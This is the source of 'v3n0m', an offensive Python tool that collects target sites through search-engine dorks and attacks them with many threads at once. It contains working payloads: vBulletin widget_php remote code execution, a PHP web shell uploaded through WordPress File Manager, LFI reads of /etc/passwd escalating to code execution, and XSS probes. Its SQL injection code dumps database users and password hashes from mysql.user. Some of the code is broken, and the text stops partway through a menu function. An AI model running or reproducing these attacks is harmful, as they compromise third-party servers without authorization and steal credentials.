#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# This file is part of v3n0m
# See LICENSE for license details.

try:
    import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, zipfile,concurrent.futures
    from signal import SIGINT, signal
    import bs4, tqdm
    from glob import glob
    from pathlib import Path
    from codecs import lookup, register
    from random import SystemRandom
    from socket import *
    from datetime import *
    from aiohttp import web
    from aio_ping import ping
    import async_timeout
    import tty
    import inspect
    from functools import wraps
    import toxin
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings()
except Exception as verb:
    print("\n|------ PYTHON PROBLEM DETECTED! Recovery Menu Enabled -----| ")
    print(" ")
    print(" ")
    print(" Exception Error Message encountered: "
          "" + str(verb))
    print(" ")
    print(" ")
    print("|--- You are advised to run either or both steps below   ---| ")
    print("|--- Recovery Menu :::: please let me know if you have any problems with it!   ---| ")
    print("| --Note, if your running Ubuntu you may need to run --> sudo apt-get install python3-bs4 --| ")
    print(" ")
    print("             V3n0M python modules can be updated with either option below            ")
    print("[1] Run Pip3.6 and Auto-Update Python3.6 modules to latest versions, ")
    print("[2] Auto-Install all the required v3n0m modules specified in the program requirements")
    print("[3] Exit")
    print(" ")
    print(" ")
    print(" Note: Both recovery options will at the end, perform a check at the end so everything is upto date")
    chce = input(":")
    import time
    import pip
    from subprocess import call

    if chce == '1':
        sys.stdout.flush()
        print("Warning This will force upgrade all Python3.6 modules")
        euid = os.geteuid()
        if euid == 0:
            print("You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
            time.sleep(6)
            os.kill(os.getpid(), 9)
        print("You will have 10 seconds to cancel this action before the system begins")
        print("Note: This will entirely reinstall all current installed modules aswell to clear possible problems")
        time.sleep(10)
        for dist in pip.get_installed_distributions():
            call("pip3 install --upgrade --no-deps --force-reinstall --user " + dist.project_name, shell=True)
            call("pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user",
                 shell=True)
            subprocess._cleanup()
        pass
    if chce == '2':
        sys.stdout.flush()
        print(
            "This will install the missing modules and upgrade them to current versions then update your Python3.6 entirely")
        euid = os.geteuid()
        if euid == 0:
            print("You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
            time.sleep(6)
            os.kill(os.getpid(), 9)
        print("You will have 10 seconds to cancel this action before the system begins")
        time.sleep(10)
        call("pip3 install termcolor --upgrade --user ", shell=True)
        call("pip3 install aiohttp --upgrade --user ", shell=True)
        call("pip3 install asyncio --upgrade --user", shell=True)
        call("pip3 install bs4 --upgrade --user", shell=True)
        call("pip3 install dnspython --upgrade --user", shell=True)
        call("pip3 install tqdm --upgrade --user", shell=True)
        call("pip3 install datetime --upgrade --user", shell=True)
        call("pip3 install requests --upgrade --user", shell=True)
        call("pip3 install socksipy-branch --upgrade --user", shell=True)
        call("pip3 install httplib2 --upgrade --user", shell=True)
        call("pip3 install aio_ping --upgrade --user", shell=True)
        call("pip3 install zipfile --upgrade --user", shell=True)
        call("pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user", shell=True)
        subprocess._cleanup()
    if chce == '3':
        exit()
__name__ = '__main__'


def donations():
    import time
    print(B + "\n---------------------------------------------------------")
    print(":" + G + "Bitcoin Address:" + R + "1DdfZzCFFFvRVkyVjG2ZPG7Udu6kMDh7Eb   " + B + " ")
    print(":" + G + "Etherium Address:" + R + "0x28AeAC2046b39da6A4De06B590c5FE8B0e65e3f0" + B + " ")
    print(":" + O + "All donations help keep this project going!")
    print(B + "----------------------------------------------------------")
    time.sleep(10)
    fmenu()


def logo():
    cache_Check()
    sql_list_counter()
    lfi_list_counter()
    rce_list_counter()
    xss_list_counter()
    misc_list_counter()
    print(R + "\n----------------------------------------------------------------")
    print(" Release Date JUL 31 2020    " + B + "        Author: NovaCygni       " + R + " ")
    print("        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               ")
    print("        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           ")
    print(" " + O + "Please check the Misc Options for Donations Options, Thank you " + R + "         ")
    print(" " + O + "Donating helps keep this project alive and active. " + R + "         ")
    print("                    _____       _____                           ")
    print("          " + G + "         |____ |     |  _  |    " + R + "                      ")
    print("             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     ")
    print("             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 ")
    print("              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                ")
    print("    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_| Release",
          current_version, " \
")
    print(" Confirmed SQLI Vulns In Database:" + O + " [", sql_count, "] " + R + "         ")
    print(" Confirmed LFI Vulns In Database:" + O + " [", lfi_count, "] " + R + "                       ")
    print(" Confirmed XSS Vulns In Database:" + O + " [", xss_count, "] " + R + "                        ")
    print(" Confirmed RCE Vulns In Database:" + O + "[", rce_count, "] " + R + "                         ")
    print(" Confirmed MISC Vulns In Database:" + O + "[", misc_count, "] " + R + "                        ")
    print("----------------------------------------------------------------\n")


def vb5classic(url):
    url = url.rsplit(sites, 1)[0]
    url = url + sites
    params = {"routestring": "ajax/render/widget_php"}
    cmd = "id"
    params["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"
    try:
        r = requests.post(url=url, data=params, timeout=5)
        if 'uid=' and 'gid' and 'groups=' in r.text:
            print(R + url + " ====> Vbulletin 5.x vuln found")
            vuln.append(url)
            misc_log_file.write("\n" + url + " vBulletin Ver 5.x > 5.5.4 RCE")
    except:
        pass


class vb5thread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    vb5classic(url)
                else:
                    break
            except(KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def vb5test():
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print("\n[+] Preparing for Vbulletin 5.x scanning ...")
    print("[+] Can take a while and appear not to be doing anything...")
    print("[!] Please be patient if you can see this message, its Working ...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i:(x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = vb5thread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass

def classicwpfm(url):
    path = '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
    url = url.rsplit(sites, 1)[0]
    url = url + sites
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
                   "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                   "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
                   "Connection": "close"}
    data = "-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"payl04dz.php\"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET['cmd']); echo 'v3n0m'; ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n"
    req = requests.post(url + path, headers=headers, data=data, timeout=10, verify=False)
    if req:
        p4th = url + '/wp-content/plugins/wp-file-manager/lib/files/payl04dz.php'
        head3r = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
                "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
                "Connection": "close"}
        payload = requests.get(p4th, headers=head3r, timeout=10, verify=False)
        if 'v3n0m' in payload.text:
            print(url + "Vuln Found ====> Wordpress File Manager > 6.9 RCE")
            vuln.append(url)
            misc_log_file.write("\n" + url + " Wordpress File Manager > 6.9 RCE")


class wpfmthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicwpfm(url)
                else:
                    break
            except(KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def wpfmtest():
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print("\n[+] Preparing for WordPress FileManager scanning ...")
    print("[+] Can take a while and appear not to be doing anything...")
    print("[!] Please be patient if you can see this message, its Working ...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i:(x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = wpfmthread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def vb56(url, shell_cmd):
    try:
        post_data = {'subWidgets[0][template]': 'widget_php',
                     'subWidgets[0][config][code]': "echo shell_exec('%s'); exit;" % shell_cmd}
        r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % url, post_data, timeout=5)
    except:
        pass
    return r.text


class vb56thread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicvb56(url)
                else:
                    break
            except(KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def vb56test():
    log = "v3n0m-lfi.txt"
    logfile = open(log, "a", encoding='utf-8')
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print("\n[+] Preparing for vBulletin Ver < 5.6.2 scanning ...")
    print("[+] Can take a while and appear not to be doing anything...")
    print("[!] Please be patient if you can see this message, its Working ...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i:(x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = vb56thread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def classicvb56(url):
    url = url.rsplit(sites, 1)[0]
    url = url + sites
    post_data = {'subWidgets[0][template]': 'widget_php', 'subWidgets[0][config][code]': "echo shell_exec('id'); exit;"}
    try:
        r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % url, post_data, timeout=5)
        if 'uid=' and 'gid=' and 'groups=' in r.text:
            print(R + url + ' =====> Vuln Found ===> vBulletin Ver 5.5.4 > 5.6.2 RCE ')
            vuln.append(url)
            misc_log_file.write("\n" + url + " vBulletin Ver 5.5.4 > 5.6.2 RCE")
    except:
        pass


class Lfithread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classiclfi(url)
                else:
                    break
            except(KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def classiclfi(url):
    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding='utf-8')
    rce_log_file = open("v3n0m-rce.txt", "a", encoding='utf-8')
    try:
        for lfi in lfis:
            try:
                url = url.rsplit('=', 1)[0]
                url = url + '='
                resp = urllib.request.urlopen(url + lfi, timeout=5)
                hits = str(resp.read())
            except:
                resp = str('v3n0m')
            if str("root:x") in hits and url not in vuln:
                print(R + ' [LFI] ' + O + url + lfi + R + "====>" 'LFI Found')
                vuln.append(url)
                lfi_log_file.write("\n" + url)
                target = url + lfi
                target = target.replace(lfi, "/proc/self/environ")
                header = "<? echo md5(NovaCygni); ?>"
                try:
                    head = {'User-Agent': header}
                    request_web = urllib.request.Request(target, headers=head, timeout=5)
                    text = urllib.request.urlopen(request_web, timeout=5)
                    text = text.read()
                    if str("7ca328e93601c940f87d01df2bbd1972") in text:
                        print(R + '[LFI >RCE]' + O + target + R + "-----> LFI to RCE Found")
                        vuln.append(url)
                        rce_log_file.write("\n" + url)
                except:
                    pass
    except:
        pass


def lfitest():
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print("\n[+] Preparing for LFI scanning ...")
    print("[+] Can take a while and appear not to be doing anything...")
    print("[!] Please be patient if you can see this message, its Working ...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i:(x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = Lfithread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def killpid():
    os.kill(os.getpid(), 9)


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicinj(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


class xssthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicxss(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


# noinspection PyBroadException
def classicxss(url):
    xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
    for xss in xsses:
        try:
            source = urllib.request.urlopen(url + xss.replace("\n", ""), timeout=5)
            hits = str(source.read())
        except:
            hits = str("v3n0m")
        if re.findall("<OY1Py", hits):
            print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
            xss_log_file.write("\n" + url)
            vuln.append(url)
        if re.findall("<LOY2PyTRurb1c", hits):
            print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
            xss_log_file.write("\n" + url)
            vuln.append(url)


# noinspection PyBroadException
def xsstest():
    print(B + "\n[+] Preparing for XSS scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i:(x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = xssthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


# Apoligies for this ugly section of code
# It is just a placeholder
# So dont worry, itll be replaced soon enough
# noinspection PyBroadException
def classicinj(url):
    aug_url = url + "'"
    global sql_list_counter
    try:
        try:
            resp = urllib.request.urlopen(aug_url, timeout=2)
        except:  # if response is not Code:200 then instead of passing nothing causing hanging
            resp = str("v3n0m")  # to throw a value to stop null/non-200-status messages hanging the scanner
        hits = str(resp.read())
        with open("v3n0m-sqli.txt", "a+", encoding='utf-8') as sqli_log_file:
            if str("error in your SQL syntax") in hits:
                print(url + " is vulnerable --> MySQL Classic")
                sqli_log_file.write("\n" + url)
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.flush()
            elif str("mysql_fetch") in hits:
                print(url + " is Vulnerable --> MiscError")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("num_rows") in hits:
                print(url + " is Vulnerable --> MiscError2")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("ORA-01756") in hits:
                print(url + " is Vulnerable --> Oracle")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Error Executing Database Query") in hits:
                print(url + " is Vulnerable --> JDBC_CFM")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("SQLServer JDBC Driver") in hits:
                print(url + " is Vulnerable --> JDBC_CFM2")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("OLE DB Provider for SQL Server") in hits:
                print(url + " is Vulnerable --> MSSQL_OLEdb")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Unclosed quotation mark") in hits:
                print(url + " is Vulnerabe --> MSSQL_Uqm")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("ODBC Microsoft Access Driver") in hits:
                print(url + " is Vulnerable --> MS-Access_ODBC")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Microsoft JET Database") in hits:
                print(url + " is Vulnerable --> MS-Access_JETdb")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Error Occurred While Processing Request") in hits:
                print(url + " is Vulnerable --> Processing Request")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Microsoft JET Database") in hits:
                print(url + " is Vulnerable --> MS-Access JetDb")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Error Occurred While Processing Request") in hits:
                print(url + " is Vulnerable --> Processing Request ")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Server Error") in hits:
                print(url + " is Vulnerable --> Server Error")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("ODBC Drivers error") in hits:
                print(url + " is Vulnerable --> ODBC Drivers error")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Invalid Querystring") in hits:
                print(url + " is Vulnerable --> Invalid Querystring")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("OLE DB Provider for ODBC") in hits:
                print(url + " is Vulnerable --> OLE DB Provider for ODBC")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("VBScript Runtime") in hits:
                print(url + " is Vulnerable --> VBScript Runtime")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("ADODB.Field") in hits:
                print(url + " is Vulnerable --> ADODB.Field")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("BOF or EOF") in hits:
                print(url + " is Vulnerable --> BOF or EOF")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("ADODB.Command") in hits:
                print(url + " is Vulnerable --> ADODB.Command")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("JET Database") in hits:
                print(url + " is Vulnerable --> JET Database")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("mysql_fetch_array") in hits:
                print(url + " is Vulnerabe --> mysql_fetch_array")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Syntax error") in hits:
                print(url + " is Vulnerable --> Syntax error")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("mysql_numrows()") in hits:
                print(url + " is Vulnerable --> mysql_numrows()")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("GetArray()") in hits:
                print(url + " is Vulnerable --> GetArray()")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("FetchRow()") in hits:
                print(url + " is Vulnerable --> FetchRow()")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
            elif str("Input string was not in a correct format") in hits:
                print(url + " is Vulnerable --> Input String Error")
                vuln.append(hits)
                col.append(hits)
                sqli_log_file.write("\n" + url)
    except:
        pass


# noinspection PyBroadException
def life_pulse():
    global life
    pulse_1 = datetime.now()
    life = pulse_1 - pulse
    print(life)


# noinspection PyBroadException
def injtest():
    global logfile
    global pulse
    global usearch
    global customlist
    global sql_list_counter
    global sql_list_count
    global sqli_confirmed
    pulse = datetime.now()
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print(B + "\n[+] Preparing for SQLi scanning ...")
    print("[+] Can take a while and appear not to be doing anything...")
    print("[!] Please be patient if you can see this message, its Working ...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i:(x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = Injthread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


# noinspection PyBroadException
def colfinder():
    print(B + "\n[+] Preparing for Column Finder ...")
    print("[+] Can take a while ...")
    print("[!] Working ...")
    for host in col:
        print(R + "\n[+] Target: ", O + host)
        print(R + "[+] Attempting to find the number of columns ...")
        print("[+] Testing: ", end=' ')
        checkfor = []
        host = host.rsplit("'", 1)[0]
        sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
        makepretty = ""
        for x in range(0, colMax):
            darkc0de = "dark" + str(x) + "c0de"
            try:
                sys.stdout.write("%s," % x)
                sys.stdout.flush()
                checkfor.append(darkc0de)
                if x > 0:
                    sitenew += ","
                sitenew += "0x" + str(darkc0de.encode("hex"))
                finalurl = sitenew + arg_end
                source = urllib.request.urlopen(finalurl).read()
                for y in checkfor:
                    colFound = re.findall(y, source)
                    if len(colFound) >= 1:
                        print("\n[+] Column length is:", len(checkfor))
                        nullcol = re.findall(str("\d+"), y)
                        print("[+] Found null column at column #:", nullcol[0])
                        for z in range(0, len(checkfor)):
                            if z > 0:
                                makepretty += ","
                            makepretty += str(z)
                        site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
                        print("[+] SQLi URL:", site + arg_end)
                        site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
                        site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
                        site = site.replace("," + nullcol[0], ",darkc0de")
                        print("[+] darkc0de URL:", site)
                        darkurl.append(site)

                        print("[-] Done!\n")
                        break
            except:
                pass

        print("\n[!] Sorry column length could not be found\n")
    print(B + "\n[+] Gathering MySQL Server Configuration...")
    for site in darkurl:
        head_url = site.replace("2600",
                                "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
        print(R + "\n[+] Target:", O + site)
        while 1:
            try:
                source = urllib.request.urlopen(head_url).read()
                match = re.findall(str("\x1e\x1e\S+"), source)
                if len(match) >= 1:
                    match = match[0][2:].split("\x1e")
                    version = match[0]
                    user = match[1]
                    database = match[2]
                    print(W + "\n\tDatabase:", database)
                    print("\tUser:", user)
                    print("\tVersion:", version)
                    load = site.replace("2600", "load_file(0x2f6574632f706173737764)")
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("root:x"), source):
                        load = site.replace("2600", "concat_ws(char(58),load_file(0x" + str(file.encode(
                            "hex")) + "),0x62616c74617a6172)")
                        source = urllib.request.urlopen(load).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                      "load_file(0x" + str(file.encode("hex")) + ")"))
                        load = site.replace("2600",
                                            "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("NovaCygni"), source):
                        print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user")
                print(W + "\n[+] Number of tables:", len(tables))
                print("[+] Number of columns:", len(columns))
                print("[+] Checking for tables and columns...")
                target = site.replace("2600", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
                for table in tables:
                    try:
                        target_table = target.replace("T", table)
                        source = urllib.request.urlopen(target_table).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] Table found: < " + table + " >")
                            print("\n[+] Lets check for columns inside table < " + table + " >")
                            for column in columns:
                                try:
                                    source = urllib.request.urlopen(target_table.replace("0x62616c74617a6172",
                                                                                         "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
                                    search = re.findall(str("NovaCygni"), source)
                                    if len(search) > 0:
                                        print("\t[!] Column found: < " + column + " >")
                                except(KeyboardInterrupt, SystemExit):
                                    raise
                                except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                                    pass

                            print("\n[-] Done searching inside table < " + table + " > for columns!")

                    except(KeyboardInterrupt, SystemExit):
                        raise
                    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                        pass
                print("[!] Fuzzing is finished!")
                break
            except(KeyboardInterrupt, SystemExit):
                raise


# noinspection PyBroadException,PyGlobalUndefined
def fscan():
    import time
    global pages_pulled_as_one
    global usearch
    global numthreads
    global threads
    global finallist
    global unsorted
    global finallist2
    global col
    global darkurl
    global sitearray
    global loaded_Dorks
    global sqli_confirmed
    global unsorted
    global sites
    threads = []
    finallist = []
    finallist2 = []
    unsorted = []
    col = []
    darkurl = []
    loaded_Dorks = []
    print(W)
    sites = input(
        "\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
    sitearray = list(map(str, sites.split(',')))
    dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
    print("")
    if int(dorks) == 0:
        i = 0
        while i < len(d0rk):
            loaded_Dorks.append(d0rk[i])
            i += 1
    else:
        i = 0
        while i < int(dorks):
            loaded_Dorks.append(d0rk[i])
            i += 1
    numthreads = input('\nEnter no. of threads, Between 50 and 500: ')
    pages_pulled_as_one = input('Enter no. of Search Engine Pages to be scanned per d0rk,  \n'
                                ' Between 25 and 100, increments of 25. Ie> 25:50:75:100   : ')
    print("\nNumber of SQL errors :", "26")
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(loaded_Dorks))
    print("Pages           :", pages_pulled_as_one)
    time.sleep(6)
    loop = asyncio.get_event_loop()
    usearch = loop.run_until_complete(search(pages_pulled_as_one))
    vulnscan()


def cloud():
    import time
    logo()
    target_site = input("Enter the site eg target.com: \n")
    print(B)
    pwd = os.path.dirname(str(os.path.realpath(__file__)))
    print("Depth Level: 1) Scan top 30 subdomains 2) Scan top 200 subdomains 3) Scan over 9000+ subdomains ")
    depth = input("Input Depth Level, 1, 2 or 3 : ")
    scandepth = ""
    if depth == 1:
        scandepth = "--dept simple"
    elif depth == 2:
        scandepth = "--dept normal"
    elif depth == 3:
        scandepth = "--dept full"
    cloud = subprocess.Popen('python3 ' + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True)
    cloud.communicate()
    subprocess._cleanup()
    print("Cloud Resolving Finished")
    time.sleep(6)


def det_Neph():
    print("")


def det_Honeyd():
    print("")


def det_Kippo():
    print("")


# noinspection PyBroadException
def vulnscan():
    global endsub
    global lfi_log_file
    global rce_log_file
    global xss_log_file
    global sql_log_file
    global misc_log_file
    global vuln
    misc_log_file = open("v3n0m-misc.txt", "a", encoding='utf-8')
    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding='utf-8')
    rce_log_file = open("v3n0m-rce.txt", "a", encoding='utf-8')
    xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
    endsub = 0
    print(R + "\n[1] SQLi Testing, " + O + "Will verify the Vuln links and print the Injectable URL to the screen")
    print(
        R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
    print(R + "[3] XSS Testing")
    print(R + "[4] LFI/RCE Testing")
    print(R + "[5] Save valid Sorted and confirmed vuln urls to file")
    print(R + "[6] Print all the UNSORTED urls ")
    print(R + "[7] Print all Sorted and Confirmed Vulns from last scan again")
    print(R + "[8] Print all Sorted urls")
    print(R + "[9] XSSTRIKE testing")
    print(R + "[10]Scan all the things")
    print(R + "[11] Back to main menu")
    print(R + "[12] MISC Vulns ")
    chce = input(":")
    if chce == '1':
        os.system('clear')
        vuln = []
        injtest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
        print()
    elif chce == '2':
        os.system('clear')
        vuln = []
        injtest()
        colfinder()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
        vulnscan()
    elif chce == '3':
        os.system('clear')
        vuln = []
        xsstest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
        vulnscan()
    elif chce == '4':
        vuln = []
        lfitest()
        endsub = 0
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
        vulnscan()
    elif chce == '5':
        print(B + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
        listname = input("Filename: ").encode('utf-8')
